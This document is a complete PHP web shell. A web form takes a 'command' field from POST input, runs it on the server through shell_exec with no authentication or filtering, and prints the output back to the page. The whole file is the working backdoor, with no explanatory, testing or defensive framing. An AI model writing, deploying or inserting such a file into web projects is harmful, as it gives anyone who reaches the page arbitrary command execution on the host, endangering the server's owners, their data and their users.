<?php

if(isset($_POST['command'])){
        $command = $_POST['command'];

        $output = shell_exec($command);
}

?>

<form action='' method='POST'>
        Command: <input type='text' name='command' /><input type='submit' />
</form>

<?php
if(isset($output))
	echo "<br><pre>$output</pre>";
?>